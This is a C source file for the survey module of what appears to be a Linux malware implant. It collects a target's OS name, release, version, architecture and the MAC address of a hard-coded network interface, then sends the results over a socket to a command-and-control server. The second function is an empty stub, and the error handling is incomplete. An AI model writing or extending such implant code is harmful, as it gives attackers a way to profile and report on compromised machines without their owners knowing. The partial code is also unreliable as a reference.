// Patrick Sacchet
// Will perform basic survey of target to report back to C2
	// OS information (sysname, hostname, kernel version, )
	// Current user info
	// Current process info
	// Adapter info

#include <errno.h>

#include "Survey.h"


int handleSurvey(int* client_fd)
{
	int status = 1, s, bytes_sent = 0;
	Response response = { 0 };
	struct utsname osinfo;
	struct ifreq freq;

	if (uname(&osinfo) != 0)
	{
		printf("Failed uname! Error: 0x%X\n", errno);
		status = -1;
		goto cleanup;
	}

	// Get MAC address
	s = socket(PF_INET, SOCK_DGRAM, 0);

	memset(&freq, 0, sizeof(freq));
	strcpy(freq.ifr_name, "ens33"); // TODO: dont hard code this
	
	ioctl(s, SIOCGIFHWADDR, &freq);

	close(s);

	for(int i = 0; i < 6; i++)
	{
		// Dont add hyphon to last portion of MAC address
		if (i < 5)
		{
			sprintf(response.surveyresponse.mac + (i *3), "%.2X-", (unsigned char)freq.ifr_hwaddr.sa_data[i]);
		}
		else
		{
			sprintf(response.surveyresponse.mac + (i *3), "%.2X", (unsigned char)freq.ifr_hwaddr.sa_data[i]);
		}
		
	}

	// Setup our response
	response.response = survey;

	strcpy(response.surveyresponse.osName, osinfo.sysname);
	strcpy(response.surveyresponse.osRelease, osinfo.release);
	strcpy(response.surveyresponse.osVersion, osinfo.version);
	strcpy(response.surveyresponse.arch, osinfo.machine);

	bytes_sent = send(*client_fd, (void*)&response, sizeof(response), 0);
    if (bytes_sent == 0)
    {
        printf("Failed to send file bytes back to C2!\n");
        status = 0;
        goto cleanup;
    }


cleanup:
	return status;
}

int sendSurveyResults(int* client_fd)
{
	int status = 1;

	// A few things to get here:
		// osName
    	// osRelease 
    	// osVersion
    	// arch
    	// mac address



cleanup:
	return status;
}